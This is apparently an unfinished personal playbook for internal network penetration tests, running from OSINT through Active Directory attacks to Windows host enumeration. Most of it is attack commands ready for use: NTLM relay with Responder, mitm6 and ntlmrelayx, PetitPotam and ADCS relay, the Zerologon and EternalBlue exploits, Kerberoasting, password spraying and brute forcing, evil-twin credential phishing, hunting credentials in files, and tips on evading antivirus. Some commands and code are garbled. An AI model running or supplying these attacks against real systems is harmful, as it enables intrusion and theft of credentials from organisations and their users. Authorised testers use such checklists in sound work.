# Internal Pentesting ACTIVELY BEING REVISED ATM

#### Phases
	Phase 0: Initial Enumeration
		Domain information
		Data disclosures
		Breach data
	Phase 1: In Network
		Initial enumerations uncredentialed in a network
		Port and Protocol Attacks
		In network with Username and Password
	Phase 2: On Device
		Low Level User
		Windows Priv Esc
		Admin Low Level
	Phase 3: Privilege User Access
		Domain Administrator in Network
		Domain Administrator on Host

# Phase 0: OSINT
<details>
  <summary>
    Summary
  </summary>
  The purpose of external recon on day 1 of your internal assessment is to identify information that may help with your attack. This info may include
</details>

### Domain Info
#### ASN/IP Registrars
	IANA
	arin
	RIOE
	BGP Toolkit
	Domaintools
	PTRArchive
	ICANN
	Manual
	DNS: Viewdns.info  

### Data Disclosures
 	1. The Corporate Website
		We want to see if we can find any information disclosures here that identify user information, internal contact information or anything useful (job postings for technology)
	2. Github
		https://github.com/techgaun/github-dorks/blob/master/github-dorks.txt, 
		Look for this company specifically, try to find anything associated that may give hint to passwords, keys, secrets, technology or accounts.

	3. Google Dorking
		We want to use Google dorking to find any internal documents or listings on the website that mays elude to usernames, passwords, internal contact information, domain names etc. For example, I once found an entire internal network topology map publically available.
	Find Emails: intext:'@website.com" inurl:website.com
	Find Files: filteype:pdf inurl: website.com
	
	4.  Job postings
  	  Head to glassdoor, indeed, monster, etc. Look for job postings to find roles, technology, software, etc. Look for anything that we could exploit

### User Identification/Social Media
The purpose is to build a userlist we can use to password spray or attack with internally.

#### Build
	1. User Osint to build a list
		https://phonebook.cz
		https://whatsmyname.app/
		https://hunter.io/
	2. Social Media
		LinkedIn.com https://github.com/initstring/linkedin2username
		Facebook
		Twitter

#### Exposed Credentials
	dehashed.com - sudo python3 dehashed.py -q inlanefreight.local -p  
	breach-parse
	HaveIBeenPwned

# Phase 1: In Network
## Initial Enumeration
<details>
  <summary>
    Summary
  </summary>
  We want to find all alive hosts through ping, then NMAP them for all ports. Identify the domain name, located the DC and take screenshots of any web pages.This stage is to identify the network itself. We may also be able to use enum4linux if its misconfigured without credentials.
</details>

### Identification
	1. FPING Ping the network
		CMD: fping -asgq X.X.X.X/24
			Copy this into a text file for NMAP

	2. Scan all living hosts for ports
		nmap -A  -v  -iL <IP FILE> -oA <EXPORT PATH>
		nmap -sV -sC -Pn X.X.X.X
		 Identify everything to review if needed

	3. (Optional) Identify critical ports (low hanging fruit scan)
		nmap -A -p  21,22,23,25,139,53,80,137, 443,445, 8080, 8443,69 -iL <IP FILE>

	4. Parse out the data from your NMAP scan
		./Gnmap-Parser.sh --p <nmap file>
			Run GNMAP-Parser
			Run parse function 
	5. Find the AD/DC
		Your scans most likely will have identified this already but just incase
		nmap -p 389,636,53,88 X.X.X.X
		ldapsearch -x -h <ip> -s base
		nmap -n -sV --script"ldap" and not brute -p 389 <DC-IP>

	6. Take a screenshot of all websites, dont forget for any uncommon ports or 8080,8443
		Eyewitness Port 80,443
		eyewitness --web -f <nmap IP file>
			Subdomain Busting on any internal websites
	7. Find the Domain
		Crackmapexec smb X.X.X.X
		
	8. Find all Hostnames
		Crackmapexec smb X.X.X.X/24

	9. DNS Zone Transfer
		dig axfr  <Domain_name> @name_server

### Wireshark/ TCP Dump
	Sitting in the network we can start to pick up some pieces of information by performing a packet capture. We can find other hosts, hostnames, etc. Use TCPdump to capture the traffic and export it to a Wireshark file.

	sudo tcpdump -i ens224   

### Active Directory Enumeration
If AD is not properly configured, an unauthenticated user can enumerate users, password policies, group memberships, shares and more. We can use this to identify a lot of sensitive information about a network.

#### Identify AD Information
 	1. Password Policy
		enum4linux -P x.x.x.x >> export path  
		crackmapexe <IP> -u "user" -p "password" --pass-pol
		
	2. Groups with members
		enum4linux -M x.x.x.x >> export path  
		
 	3. Shares Discovery
		enum4linux -S x.x.x.x >> export path  
		
 	4. Scan for All
		enum4linux -a X.X.X.X >> ./ADdiscovery.txt

 ### Petipotam
 	petitpotam.py -d <domain> <listenter_ip> <target_ip>
You can attempt this without credentials if its poorly configured
If it states connected, successfully bound. Then something went wrong, this was successful. 

### ADCS Verification (uncredentialed attempt)
	certutil.exe to identify if the domain is using a certificate authority.
		Then http://CertificateServer/certsrv
	
	We will run an ntlmrelayx attack against the server
		ntlmrelayx.py -t http://CertificateServer/certsrv -smb2support --adcs --template DomainController
	
# Phase 1: In the Network
## Glossary
1. Enumerate the Network
2. Identifying Valid Credentials
3. Ports and protocol attacks
4. Common Exploits

## Identifying Valid Credentials
The key here is we may be able to guess or build users. We can attack printers to find usernames or attempt to login to network equipments with defaults to find credentials. Some ports and protocols like SMB may also give us credentials.

## Glossary
1. Enumeration by Configuration
- Finding users through RPC, LDAP, RID, NMAP
- Default Credentials
- Breached Credentials
- Overpermissive AD
- Password Sprays
2. Enumeration by Attack
- Responder
- MITM6
- WPA attacks/wireless attacks
- Printers

## Enumeration by Configuration
### Find Domain Users without Credentials
	1. Enum4Linux
		enum4 linux -U X.X.X.X
		enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
		Machine list > enum4linux -M x.x.x.x >> export path 
	2. RPCCLIENT
		rpcclient -U "" -N X.X.X.X
		Then enumdomusers
	3. CME
		crackmapexec smb X.X.X.X --users
	4. Ldap
		ldapsearch -H 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
		ldapsearch -x -h X.X.X.X -b base namingcontext
	5. Windap
		./windapsearch.py --dc-ip 172.16.5.5 -u "" -U

	6. RID -Impacket
		impacket-lookupsid DOMAIN/guest@X,X,X,X

	7. NMAP 
		nmap -p 88 --script=krb5-enum-users --script args="krb5-enum-users.realm='<DOMAIN>'.userdb=<user_list_file> <IP>

### Default Credentials
	https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials
	https://github.com/ihebski/DefaultCreds-cheat-sheet/blob/main/DefaultCreds-Cheat-Sheet.csv
	
### OWA
	1. Import the PS tool
		import-module C:\Tools\MailSniper\MailSniper.ps1
	2. Get info about the domain
		Invoke-DomainHarvestOWA -ExchHostname X.X.X.X 
	3. Enumerate valid users from a list of potential usernames
		Invoke-UsernameHarvestOWA -ExchHostname X.X.X.X -Domain domain -UserList .\possible-usernames.txt -OutFile valid.txt
	4. Password spraying
		Invoke-PasswordSprayOWA -ExchHostname X.X.X.X  -UserList .\valid.txt -Password Summer2021
	5. Get addresses list from the compromised mail
		Get-GlobalAddressList -ExchHostname X.X.X.X  -UserName domain\[username] -Password Summer2021 -OutFile gal.txt


## WE HAVE A USERLIST
Once we have a username list we can use kerbrute to validate they exist. Any of the above methods may spit out valid accounts as well. All of these suggest a guest/anony can identify accounts

#### Kerbrute
	1. Installing
		sudo git clone https://github.com/ropnop/kerbrute.git
		sudo make all
		echo $PATH
		sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
	2. Enumerating
	kerbrute userenum -d DOMAIN.com --dc X.X.X.X username.txt -o validUsers
		./kerbrute_linux_amd64 passwordspray -d <DOMAIN.com> <username file> <single password to test>
		anything returned PRINCIPAL UNKNOWN isnt a legit account stealthy too.

## Password Attacks
### Keyspace Techniques
	1. About Keyspace Techniques
		A method of preparing a wordlist by specifying a range of characters and numbers and symbols in the wordlist.
		A tool used for this is crunch, we can specify numerous options, min and max and options
	2. Example Commands
		crunch 2 2 01234abcd -o crunch.txt
		this will generate all possible password combinations of 2 characters including 0-4 and a-d. The -o specifies a file to save output to.
		cmd: crunch 8 8 0123456789abcdef -o crunch.txt
		this outputs a minimum and and max of 8
	3. If we know part of the word in the password and want all possibilities you can do the following
		cmd: crunch 6 6 -t pass%
	4. This says the password is 6 characters and the pass part is followed by numbers
		other character specifiers
		@ = lower case alpha characters
		, upper case alpha characters
		^ special characters including space

### Other Techniques
	1. CUPP
		About CUPP - Common User passwords profiler
			automatic and interactive tool written in python for creating custom wordlists
			used to build passwords based oof well known details about the target THIS MEANS OSINT is needed
			This also has L33t mode which allows for someone to replace a,e,i,o,u with numbers.
		Running CUPP
			Install from git clone https:.//github.com/Mebus/cupp.git then run CMD: python3 cupp.py
			you can also include default creds from the alecto database using -a
	2. Website Password Lists
		cewl -m 8 -w wordlist.txt <URL>
	3. Lockout Policy ID
		enum4linux -u "User:" -p "password" -P <IP>
		You can test this against a user by locking out with crackmapexec
		crackmapexec smb <IP> -u USERNAME -p <doesnt matter> -d <domain>  
	4. User and Password Attack
		cme smb <dc-IP -u user.txt -p password.txt --no-bruteforce
		cme smb <dc-ip> -u user.txt -p password.txt (only use if no lockout policy)
		crackmapexec smb <dc-ip> -u user.txt -p "PASSWORD" -d <domain> (use this to test single passwords)
		Note the amount of failed attempts to lock out and then time the reset, wait for 30 minutes first and then increment to 1 hour. This is tedious and is used if other methods dont work.

#### Python NTLM Password Spray
	Name it ntlm_passwordspray.py
		python ntlm_passwordspray.py -u <USERNAMEFILE> -f <FQDN of organization were attacking> -p <SINGLE PASSWORD> -a <the URL of the application that supports windows authentication
	EXAMPLE:
		python ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a   
		def password_spray(self, password, url): 
		print ("[*] Starting passwords spray attack using the following password: " + password)
	#Reset valid credential counter 
		count = 0 
	#Iterate through all of the possible usernames 
		for user in self.users: 
	#Make a request to the website and attempt Windows Authentication 
		response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password)) 
		#Read status code of response to determine if authentication was successful 
		if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE): 
		print ("[+] Valid credential pair found! Username: " + user + " Password: " + password) 
		count += 1 
		continue 
		if (self.verbose): 
		if (response.status_code == self.HTTP_AUTH_FAILED_CODE): 
		print ("[-] Failed login with Username: " + user) 
		print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")   

## Enumeration by Attack
- Responder
- MITM6
- WPA attacks/wireless attacks
- Printers

### LLMNR, NBT-NS, WPAD Attack
1. We want to run this attack during primary times of logins etc, we like to focus when the admins/users login around the morning wave, the lunch return times as well. NOTE: you can't run Mitm6 and responder at the same time, they use the same ports and cant run together.Computer trys to connect to a server but the user sends something wrong sending a DNS issues so the server says what are you talking about? So broadcast message is sent to everyone to see if anyone knows who this weird guy is. You MiTm this and say I do send me your hash and I will. We use responder, this should run first thing in the morning or right after lunch. You need a lot of traffic. Key flaw, when you respond to this, it responds back to you with a username and password hash. Example of an event: Someone types in the wrong network drive. Once this happens, an event occurs and we will see the username and NTLM hash. EASY TERMS: Okay so kali is in the environment and your are listening on responder. When a windows computer tries to access your IP address for a share or something, responder captures the username and hash. 

2. For SMB RelayTake the hashes we get from responder and forward them, SMB signing has to be enabled because it’s a packet level protocol. If siginig is disabled then it  never checks for authentication of the user and hash.User being relayed has to have admin creds on the target machine 

#### The Attack
	1. Validate SMB Signing is disabled to run SMB Relay
		NMAP CMD: nmap -p 445 --script=smb2-security-mode X.X.X.X
		NMAP CMD: nmap -p 139--script=smb2-security-mode X.X.X.X
		
	2. Configuring (only if doing relay)
		Go into responder config file
		vim /opt/responder/Responder.Conf
		vim /etc/responder/Responder.conf
		Turn off smb and http 
		
	3. Running Responder
		responder –I INTERFACE(ETHO) -v -w
		
	4. Attack for SMBrelay
		impacket-Ntlmrelayx.py -tf targets.txt -smb2support
		Nc 127.0.0.1 11000 
		impacket-Ntlmrelayx.py --add-computer  
		usually gives initial access.
	5. The Results
		Now we just wait for an event, if an admin, it will dump the sam files for the local users. 
		We get hashes from the sam and will try to laterally move 
		Will attempt for an interactive shell and say if it worked, open a new tab 
		We are in an smb shell essentially, so start listing to find items 
		Try use ADMIN$ to get into system32 
		You could do a metasploit shell with multihandler using the ntlmrelayx 
	6. Cracking NTLMv2 Hash with hashcat
	hashcat -m 5600 ntlm /WORDLIST.txt -r Rule.rule 

### MITM6
On a seperate machine run this, they cant run on the same device

#### Attack
	1. Start
		Mitm6 –d DOMAIN 
		Replies start coming in 
	2. Relay attack 
		Ntlmrelayx.py -6 –t ldaps://IP of DC –wh fakewpad.DOMAIN -l text.txt 
	3. This will add a user and password as an admin
		mitm6 -d <domain>
		ntlmrelayx.py -6 -wh <attackerIP> -; /tmp - socks -debug
		ntlmrelayx.py -6 -wh <attackerIP> -t smb://<target> -l /tmp -socks -debug
		ntlmrelayx.py -t ldaps://<dc IP> -wh <attacker_ip> --delegate-access
	4. If any of these work
		(impacket) ./getST.py -spn cifts/<target> <domain>/<netbios Name>\$ -impersonate <user>

### Wireless Attacks/WPA Ehh
 SECTION UNDER WORK. The main goal with our testing is to identify if I can move to sensitive areas from wireless areas.
 
#### Evil Twin
	Copy the current wifi that are nearby, we need to discover the other Wifi's password
	3 Factors in play
		1. A target connected to a wireless network, the victim connects to an AP which connects to the network. We add a MITM situation to terminate this connection to force them to go through us. The whole point is we want to steal the wireless password.
		2. Create the fake network
		3. Convince users to move them to new network
			when they try to reconnect, they should see the other wifi and login without a password. When they go to this page, it should then auto populate a fake webpage asking for credentials to login.

### Printers
I always have a lot of success here creating userlists from default logins. I have used this technique many times to gain initial credentials.

#### The Attacks
	1. Responder Passback Attacks  (LDAP Attack)
		Netcat and responder can do this 
		Printer based attack where you send the password back to your machine instead of the DC by setting the LDAPs to you. 
			Printers who scan from printer to computers, the user in the platform is usually a domain admin and dump the creds with the passback attack. PRINTERS ARE A HUGE ATTACK vector. 
		Jenkins is often wide open for a shell 
		
	2. Printer Usernames
		Printers often have default configs which means we can gain access to them using default credentials. I will leverage this to identify valid usernames.

#### ASREP
 	impacket-GetNPUsers DOMAIN/ -no-pass -userfile USERNAMES.txt
 		*Add the domain name to your hosts file to be safe.
    		Once you get this, you can attempt to crack the hash offline
		Possible roastable meaning user didnt need creds to request a TGT from the KDC.

## Port and Protocol Attacks
This section is attacking any discovered ports and protocols from our nmap scans but uncredentialed. This is looking for vulnerabilities that may be present, misconfigured services, etc. This section will grow and grow if we included everything because this grows all the time. Here are some basic methods to begin attacking.
- Netbios
- SMB
- MSRPC MISSING
- LDAP MISSING
- FTP
- Telnet
- SSH
- HTTP/HTTPs
- SQL MISSING
- RDP MISSING
- SNMP
- SMTP
- POP3

### Netbios
    	1. Access
		nmblookup X.X.X.X/CIDR
		nbtscan X.X.X.X/30
		nbtscan -a X.X.X.X
		nmap -sU -sV -T4 -p137,138,139 -Pn -n --script=nbstat.nse X.X.X>X

    	2. Port 137 UDP, NetBios
		Add name  
		registers a NetBIOS name
		Add group name
		Delete Name
		Find Name

    	3. Port 138  UDP  Datagram Mode
		Send datagram:send a datagram to a remote NetBIOS name
		Send Broadcast Datagram: send a datagram to all NetBIOS names on the network
		Recieve Datagram: wait for a packet to arrive from a send datagram operation
		Recieve Broadcast Datagram: wait for a packet to arrive from a send broadcast datagram operation

    	4. Port 139 TCP Session Mode
		Call:opens a session to a remote netbios name
		Listen: listen for attempts to open a session to a NetBIOS name
		Hang up: close a session
		Send:send a packets to the computer on the other end of a session
		Send no ack:like send, doesnt need an ACK
		Recieve:wait for a packet to arrive from a send on the other end of a session

### SMB 
    	1. SMB listing finds two shares
    		smbclient -L \\\\X.X.X.X
    	2. List Guest Access on SMB Share
		enum4linux -a -u "" -p "" <DC-IP>
		enum4linux -a -u "guest" -p "" >DC-ip>
		smbmap -u "" -p "" -P 445 -H <DC-ip>
		smbmap -u "guest" -p "" -P 445 -H <dc-ip>
		smbclient -U '%' -L //DC-IP
		smbclient -U 'guest%' -L //dc-ip
		cme smb <IP> -u '' -p ''   looks for null sessions
		cme smb <ip> -u 'a' -p "" looks for anonymouse access

    	3. Listing shares on devices
		smbclient -L //X.X.X.X/
		smbclient -L //X.X.X.X/ -U '' -N

    	4. Connect to shares using CME
    	crackmapexec SMB -u guest -p "" --shares this shows we have access to read some shares

    	5. Use the spider module to search through these shares
		crackmapexec SMB -u guest -p "" -M spider_plus

    	6. This creates a file output we can read, find several files
		Download the files using smbclient
		smbclient -n //X.X.X.X/share
		get file
### MSRPC 
    	1. rpclient
		rpcclient -U "" -N X.X.X.X
			enumdomusers find users
			querydominfo  domain information
			getdompwinfo get password policy
	
### LDAP COMING SOON
	
### FTP
    	1. Banner Grab
		telnet X.X.X.X 21
    	2. Brute Force
		hydra -l ftp -P <WORDLIST> ftp://X.X.X.X

    	3. Anon Login
		ftp X.x.x.x
		anonymous anonymous
	
### Telnet
Telnet is an insecure protocol, if you can get access to the server, you can run wireshark and capture plaintext logins.

    	1. GuestLogin
		Telnet "guest"@X.X.X.X
		Telnet may have the guest account enabled which does not require a password to login
	
### SSH
	hydra -L users.txt -P <WORDLIST> ssh://x.x.x.x -v
	Hydra can also brute force this but you need a great user list and wordlist

### HTTP/HTTPs
    	1. Banner Grabbing
		telnet X.X.X.X 80
		See web pentesting checklist
	
### SQL COMING SOON
### RDP COMING SOON
	
### SNMP
<details>
  <summary>
    Summary
  </summary>
  SNMP v1 and v2 communicate in clear-text allowing us to find community strings. 
THE BIGGEST EXPLOIT seen with this is when SNMP public community strings are left as "public" which is the default.
Community strings can be set to whatever the system administrator wants so a good dictionary should include company related terms, sports teams, etc.
Process Identify the presence of SNMPv1 or v2, Test default strings, Brute force strings, Enumerate the system for users, softwared, ram,machines, Use this information to create your user list and device list.
</details>

#### NMAP Discovery
    	We can check this with NMAP by first identifying the SNMP version
    	nmap -sV -Pn -sU -p161,162 X.X.X.X
#### If we get a successful SNMPv1 or v2 we know we are in luck to test for public strings
    	nmap -Pn -sU -p 161,162 --script=snmp-brute X.X.X.X
- The output here wll state snmp brute public -valid credentials. Meaning that public are used to read and write snmp data.
#### Brute force with custom wordlists
    	sudo nmap -sU -p161,162 --scriptsnmp-brute --script-args snmp-brute.communitiesdb=/PATH X.X.X.X
#### We need to identify SNMP interfaces to understand where we can begin attacking
    	nmap -Pn -sU -p 161,162 --script=snmp-interfaces X.X.X.X
#### One of these interfaces should have the IP address we are scanning, NMAP Users and machine grabs
    	nmap -sU -p161,162 --script=snmp-* X.X.X -oG desktop/file.txt
	
#### SNMP-check Tool
    	snmp-check X.X.X.X -c STRING
- This tool can provide some  awesome information such as hostname,description, uptime, user accounts, routing informaiton and listening ports.

Switches
• -p port
• -c string, default is public
• -v snmp version
• - disable TCP
• -t timeout
• -r retries
• -i info
• -h help

#### onesixtyone tool
    	onesixtyone -c /path/onesixtyone/dict.txt X.X.X.X
- This is used to brute force communities with a wordlist

#### snmpwalk tool
    	snmpwalk -c public X.X.X.X -v1
    	snmpwalk -c private X.X.X.X -v1
We can use this tool to identify specific strings by testing them

**Extract the system name (the OID) I dont quiet understand this yet**
- snmpwalk -c public X.X.X.X -v1 -On | grep '1.3.6.1.2.1.1.5'
- -c is the string
- the numbers are the sysName value
- If it is misconfigured and has RW then you can change the name with
- snmpset -v 1 -c public X.X.X.X 1.3.6.1.2.1.1.5.0 s HACKED
- Extract System Data
- snmpwalk -v2c -c public X.X.X.X
- snmpwalk -v2c  -c public X.X.X.X hrMemorySize
- View installed software
- snmpwalk -v2c -c public X.X.X.X hrSWInstalledNamed
- Search RAM on the host

#### MSFCONSOLE Enumerate SNMP
    	use auxiliary/scanner/snmp/snmp_enum
    	set RHOSTS
    	set community STRING
    	you can also not set the string and see if data is returned
    	run
    	Login to SNMP to test strings
    	 use auxiliary/scanner/snmp/snmp_login
    	set RHOSTS
    	run
    	This will provide successful login strings.
 #### SNMP Set OID Value
    	 use auxiliary/scanner/snmp/snmp_get
    	set OID X.X.X.X.X.x
    	set OIDVALUE words!
    	set RHOSTS X.X.X.X
    	exploit
- The value should be shown as the new value

### SMTP
    	hydra -l ermail@domain.com -P <URL> smtp://x.x.x.x -V
	-We can brute force SMTP servers using hydra but you may need to specify port 25 depending if you use a different tool.


### Pop3
    	telnet X.X.X.X 110   or    telnet x.x.x.x 993
 
    	Pop3 Telnet Commands
    	- USER username
    	- PASS password
    	- STAT
    	- LIST  list email files
    	- RETR NUMBER   retrieves emails
    	- DELE deletes
    	- NOOP
    	- RSET
    	- TOP
    	- UIDL
    	If you dont have credentials, you can brute force it with HYDRA
		hydra -l USERNAME -P <password list> pop3.live.com? -s PORT pop3
		https://book.hacktricks.xyz/network-services-pentesting/pentesting-pop	
	
## Common Vulnerabilities
	- Run Nessus and be sure to review the informationals
	
### iLO
iLo has a really known and effective vulnerability for outdated versions. https://www.exploit-db.com/exploits/44005

#### tomcat/jboss manager
auxiliary/scanner/http/tomcat_enum
exploit/multi/http/tomcat_mgr_deploy

#### java serialized port
ysoserial

#### MS14025
use scanner/smb/smb_enum_gpp
NOTE: you may need to use creds for this, if so see this exploit in the after creds obtained section

#### MS17-010 Eternal Blue
• msfconsole use exploit/windows/smb/ms17_010_eternalblue

#### Bluekeep

#### Zerologon (this can provide administrator access)
• NOTE: zerologon exploited may cause significant impacts against the host you are attacking. 
• python cve-2020-1472-exploit.py <MACHINE BIOS NAME> <IP>
• secretsdump.py <Domain>/<machineBIOS>\$@<ip> -no-pass -just-dc-user "Administrator"
• secretsdump.py -hashes :<hash_admin< domain>/Administrator@<ip>
• python3 restorepassword.py -target-ip <IP> <DOMAIN>/<machine bios name>@<machine bios name> -hexpass <hexpass>

#### Heartbleed
• nmap -sV --script=ssl-heartbleed X.X.X.X
• msfconsole use /auxiliary/scanner/ssl/openssl_heartbleed

#### Log4J
	
#### SMBGhost CVE-2020-0796

IF ANY OF THESE are compromised -> privilege escalation time to gain administrator
winpeas
search password files findstr /si "password" *.txt *.xml *.docx
juicy potato/ lovely potato
printSpooler
rogue potato

	
# Phase 2: Network Attack with Credentials
## Attacks within the Network
<details>
  <summary>
    Summary
  </summary>
	At this point in the attack we are in the network, with what we believe are valid credentials so we want to see what we can do with these credentials.
</details>
<details>
  <summary>
    Enumeration
  </summary>
	At this point we want to re-do all enumeration from the uncredentialed access to gain a deeper picture. This is assuming you got NOTHING from uncredentialed on enumeration so it is a bit repetitive.
</details>

#### Validate Access
    	crackmapexec smb X.X.X.X/24 -U USERNAME -P password 
    	crackmapexec smb X.X.X.X/24 -U USERNAME -P password --local-auth   (local access)	

#### Find Users
    	cme smb X.X.X.X -u USERNAME -p PASSWORD --users	
    	enum4linux -U x.x.x.x   | grep 'user' 
    	enum4linux -M x.x.x.x	
    	cme smb X.X.X.X -u USERNAME -p PASSWORD --loggedon-users
	
#### Find Shares
    	cme smb X.X.X.X -u USERNAME -p PASSWORD --shares
    	cme smb X.X.X.X -u USERNAME -p PASSWORD --shares "share name"

#### Spider Shares
    	cme smb X.X.X.X -u USERNAME -p PASSWORD --spider "share name"
    	crackmapexec smb X.X.X.X -u avazquez -p Password123 --M spider_plus
    	head -n 100 /tmp/cme_spider_plus/X.X.X.X.json

#### Password Policy
    	crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
    	enum4linux -P x.x.x.x

#### SMB
    	With SMB, you may be able to put a URI File Attack to gather more credentials or find sensitive data to escalate.
    	smbmap -u USERNAME -p PASSWORD -d DOMAIN -H X.X.X.X. -R 'Share name' --dir-only
    	cme smb <IP> -u <USER> -p <PASS> --shares
    	smbclient -L //IP/ -U <username>   (this lists the shares)
    	smbclient //IP/SHARE -U <USER>	(this connects to the share, we can run get to obtain files from this device to read)

## AD Attacks
### Bloodhound
    	Enumerate AD in it's entirety and look for threats. You should know how to ingest data into bloodhound/neo4J.
    	bloodhound-python -u USERNAME -p PASSWORD -ns X.X.X.X -d DOMAIN -c -all
    	bloodhound.py -c All,Loggedon -U username -p PASSWORD -d DOMAIN -ns X.X.X.X
	
### Secrets Dump
    	If you find local auth PWNED, then you are in luck to try this attack.
    	secretsdump.py domain/USERNAME:password@X.X.X.X
	
### Kerberoasting
<details>
  <summary>
    Summary
  </summary>
Services run on machines under user accounts usually local to machine or a domain account. The SPN is unique to the service.SPNS are used with kerberos to associate a service with a logon account and are configured on the user object in AD.
YOU CAN FIND THIS in AD under attribute editor servicePrincipalName
We need valid creds, this can be
cleartext password, NT password hash, or a kerberos ticket
</details>
 		
#### Attack
	List all SPN Accounts
    	getuserspns.py -dc-ip X.X.X.X domain.local/username
	Pull TGT Tickets for offline processing
    	GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request  -outputfile sqldev_tgs  
	Request a single ticket
    	GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev  -outputfile sqldev_tgs  
	Crack offline
    	hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt   
	
### ASREP
<details>
  <summary>
    Summary
  </summary>
Kerberos Do Not require kerberos preauthentication checked, found in AD-> Account -> options
We can request the AS-REP for the user and crack offline. This is usually done if the account associates with a linux system.
</details>
	
#### Attack
    	impacket-GetNPuserss.py -request -dc-ip 192.168.2.160 <DOMAIN.FULL>/<USERNAME:password-outputfile hashes.txt -format hashcat

#### Then crack the hash
    	hashcat -m 18200 -a 0 ASREProastables.txt $wordlist -r RULE.rule

#### COBALT STRIKE
    	beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname
    	NOTE, WE DONT WANT TO AS-REP everyone so do it one by one
    	Then grab the hash
    	beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:test_svc /nowrap 
    	Finally crack it offline
    	john --format=krb5asrep --wordlist=wordlist test_svc

### GPP Vuln
Looking for a plaintext password inside of group policies for the GPP vulnerability.This is an impacket toolset.
#### Attack
    	./getgpp.py 'DOMAIN/USERNAME:password@X.X.X.X' -dc-ip x.x.x.x

## ADCS
	
## Attacks on Windows Machines This section is actively being cleaned, it is messy.

### ENUMERATION PROCESS
- System info
- Ipconfig
- arp
- routing table
- Protections AV (can we use cmd or powershell)
- running services (look for things running as NT authority/system)

### System Enumeration
#### System info
	systeminfo
#### OS VERSION
	systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" 
#### PATCHES
	wmic qfe get caption, description  for updates that are installed
#### RUNNING SERVICES 
	net start   this shows what services are started
#### INSTALLED APPS 
	wmic product get name,version,vendor  get installed aps
#### TASKS RUNNING
	tasklist /svc
#### standards running
	smss.exe, csrss.exe, winlogon.exe, lsass,svchost.exe
#### SCHEDULED TASKS 
	Schtasks /query /fo LIST /v  
#### FIND ENVIRONMENT VARIABLES:
	cmd= PATH   allows us to find paths we may be able to run files
	cmd = set  may dispaly file shares and other locations of data, if we see roaming profiles we could make users take malicous files with them as well.

#### LOCAL USERS/GROUPS
	
#### ICACL PERMISSIONS
####DriversQuery for device drivers driverquery
#### GET RUNNING PROGRAMS 
	netstat -ano
LOGGED IN USERS
	#### query user
#### FIND SERVICES AND PORTS
	run the netstat -ano then verify PID to tasklist.

### User Enumeration
    	net user /domain
    	net user /localgroup
    	net accounts /domain 
    	 whoami
#### MY PRIVILEGES: 
	whoami /priv   is DISABLED then we have that permission
#### MY GROUPS
	whoami groups
#### LOCAL PASSWORD POLICY
	net accounts
#### Local accounts, verify
	Use the local security policies

### AD Powershell Enumeration
    	get-aduser -Filter *
    	Get-ADUser -Filter * -SearchBase "CN=Users,DC=THMREDTEAM,DC=COM"
	
### Network enumeration
    Ifconfig
    route print
    netstat -ano
    verify listenrs by netstat -abno
    arp -p
	wmic nicconfig get description,IPAddress,MACaddress 
#### Network shares, What is your connection to the network, can we do anything?
#### Are we domain joined?
    	systeminfo | findstr Domain
#### FIND LOGON SERVER
	echo %logonserver%
#### FIND AD DOMAIN NAME
	ysteminfo | findstr /B /C:"Domain"
#### Group policy
	gp policy retrieval

### Run advanced IP scanner
This allows us to see file shares, websites and devices in the network. If you download but setup as run instead of install, I find this doesnt get blocked by AV this way.
- This is a cool tool because you can download the exe but choose to run instead of install. This bypasses a lot of restrictions on user downloads or EDR tools.
- https://www.advanced-ip-scanner.com

### Password Hunting 
Search for passwords or important files

### FILE SEARCH
- Look for any installed services with config files with hard coded creds
- Look at bat files or any scripts on the system with hard coded creds
#### Find Sensitive Strings
	findstr /s password  *.*
	findstr /s pass  *.*
	findstr /s username  *.*
	findstr /s admin *.*
	findstr /si password *.txt
	findstr /si password *.xml
	findstr /si password *.ini  
	findstr /si password *.config
	dir /s *pass* == *cred* == *vnc* == *.config*  
	Otherwords, administrator, root,
#### ALL PASSWORDS IN ALL FILES: 
	findstr /spin "password" *.* findstr /spin "password" *.*  
#### SSH, USE ANY USERNAMES FOUND during user enumeration.
	RESOURCE: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/findstr
#### Search Directories for file names
	dir <search terms> /s  
	dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
	dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
	will look for the file in the search terms
#### Others
	Open registry Ctrl + F -> type key words {administrator, password, pass, root, admin)
	reg query HKLM /f password /t REG_SZ /s  
	Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
	Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\  
	Look at the windows security eventsfor SYSTEM event ID 4625. If a user accidently types their password into the username field, it shows in plaintext 
#### Stored Passwords
	lazagne.exe all
	vaultcmd /listcreds:"Windows Credentials" /all  
	mimikatz-> mimikatz vault::list  
#### Internet browsers may have sessions initiated and logged in through cookies, enumerate the browsers.
	Saved Windows Credentials
	cmdkey /list
	test them: runas /savecred /user:admin cmd.exe
	SharpChrome
	Review the browser for saved passwords

### AV Enumeration
	wmic /namespace:\\root\securitycenter2 path antivirusproduct
	Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct

### WINDOWS DEFENDER
	sc query windefend  
	Get-Service WinDefend
	Get-NetFirewallProfile | Format-Table Name, Enabled
	Get-MpComputerStatus | select RealTimeProtectionEnabled
#### DISABLE IT
